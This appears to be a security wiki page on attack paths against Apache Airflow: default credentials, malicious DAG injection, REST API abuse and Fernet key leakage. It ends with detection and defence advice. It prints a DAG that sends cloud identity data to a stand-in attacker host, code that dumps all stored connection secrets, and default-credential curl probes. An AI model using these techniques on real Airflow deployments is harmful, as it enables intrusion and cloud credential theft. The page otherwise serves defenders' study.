---
title: Apache Airflow Attack Paths — DAG Injection and Fernet Key Leakage
slug: airflow-attacks
---

> **TL;DR:** Internet-exposed Airflow web UIs ship with default credentials, accept attacker-authored DAGs that execute as the scheduler, and store connection secrets under a single Fernet key that often lives in the repo.

## What it is
Airflow is the de-facto data-pipeline orchestrator in cloud data stacks. Its web UI, REST API, and DagBag loader are routinely exposed without auth, and the platform's design — Python code as configuration — makes any write to the DAGs folder equivalent to RCE under the scheduler's IAM role. The 2023 Shadowserver scans found thousands of exposed instances.

## Preconditions / where it applies
- Airflow 2.x with `auth_backends = airflow.api.auth.backend.default` (no auth) or `airflow/airflow` defaults
- Network reach to the webserver (8080) or to a Git-sync sidecar pulling DAGs from a writable repo
- File write to the DAGs folder, or REST API access with `DAG:edit` permission

## Technique
Default credential check and API enumeration:

```bash
curl -u airflow:airflow https://airflow.target.tld/api/v1/dags
curl -u airflow:airflow https://airflow.target.tld/api/v1/connections | jq
```

DagBag code injection — drop a DAG file; the scheduler imports it on next parse cycle:

```python
# /opt/airflow/dags/evil.py
from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime

with DAG("evil", start_date=datetime(2026,1,1), schedule_interval="@once") as d:
    BashOperator(
        task_id="x",
        bash_command="curl https://attacker.tld/$(aws sts get-caller-identity | base64 -w0)"
    )
```

`PythonOperator` RCE via the REST API when DAG-edit is allowed:

```bash
curl -u user:pw -X POST https://airflow.target.tld/api/v1/dags/evil/dagRuns \
  -H 'Content-Type: application/json' \
  -d '{"conf":{"cmd":"id"}}'
```

Connection secret exfil — `airflow.models.Connection` decrypts with the Fernet key at runtime, so any DAG can dump every cloud connection:

```python
from airflow.hooks.base import BaseHook
for c in BaseHook.get_connections(""):
    print(c.conn_id, c.get_uri())  # AWS, Snowflake, GCP keys in plain
```

Fernet key leakage — `airflow.cfg` or a Helm `values.yaml` checked into Git exposes `fernet_key = ...`; offline-decrypt the `connection` and `variable` tables from a stolen DB dump.

## Detection and defence
- Front the UI with SSO + network ACLs; never expose 8080 publicly; rotate the default user
- Enable RBAC, scope `DAG:edit` to pipeline owners, and sign DAGs via a code-review-gated Git-sync (no shared writable PVC)
- Rotate the Fernet key on personnel changes; store it in a KMS-backed secret, never in Git
- Stream `audit_log` table and webserver access logs to SIEM; alert on new `dag_run` from non-CI principals and on `import_errors` spikes (DagBag probing)
- Prefer Kubernetes/CeleryExecutor with per-task service accounts so DAG RCE doesn't inherit the scheduler's role

## References
- [Airflow Security model](https://airflow.apache.org/docs/apache-airflow/stable/security/index.html) — official threat model
- [CISA alert AA23-263A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-263a) — exposed orchestrators in critical infra

See also: [[ci-cd-as-cloud-attack-surface]], [[terraform-state-extraction]], [[managed-identities]].
